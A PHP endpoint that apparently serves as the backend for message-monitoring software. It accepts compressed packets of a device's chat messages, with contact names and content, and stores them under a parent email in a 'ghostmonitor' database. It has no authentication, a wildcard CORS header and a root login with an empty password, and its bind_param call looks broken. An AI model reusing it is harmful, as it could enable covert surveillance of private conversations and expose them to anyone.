<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');

// Get device info from query params
$deviceId = $_GET['device_id'] ?? null;
$parentEmail = $_GET['parent_email'] ?? null;

if (!$deviceId || !$parentEmail) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing device_id or parent_email']);
    exit;
}

try {
    // Read JSON body
    $body = json_decode(file_get_contents('php://input'), true);
    
    if (!isset($body['data'])) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing data field']);
        exit;
    }

    // Decode Base64 and decompress
    $compressed = base64_decode($body['data'], true);
    if ($compressed === false) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid Base64 data']);
        exit;
    }

    $data = gzdecode($compressed);
    if ($data === false) {
        http_response_code(400);
        echo json_encode(['error' => 'Failed to decompress data']);
        exit;
    }

    $packets = json_decode($data, true);
    if (!is_array($packets)) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid packet data']);
        exit;
    }

    // Connect to database
    $conn = new mysqli(
        getenv('DB_HOST') ?: 'localhost',
        getenv('DB_USER') ?: 'root',
        getenv('DB_PASS') ?: '',
        getenv('DB_NAME') ?: 'ghostmonitor'
    );

    if ($conn->connect_error) {
        http_response_code(500);
        echo json_encode(['error' => 'Database connection failed']);
        exit;
    }

    $inserted = 0;
    foreach ($packets as $packet) {
        $stmt = $conn->prepare(
            "INSERT INTO conversations (device_id, parent_email, app_type, contact_id, contact_name, content, timestamp, direction) 
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
        );
        
        $stmt->bind_param(
            'ssssssii',
            $deviceId,
            $parentEmail,
            $packet['appType'] ?? 'unknown',
            $packet['contactId'] ?? '',
            $packet['contactName'] ?? '',
            $packet['content'] ?? '',
            $packet['timestamp'] ?? time(),
            $packet['direction'] ?? 0
        );

        if ($stmt->execute()) {
            $inserted++;
        }
        $stmt->close();
    }

    $conn->close();

    http_response_code(200);
    echo json_encode(['success' => true, 'inserted' => $inserted]);

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => $e->getMessage()]);
}
?>
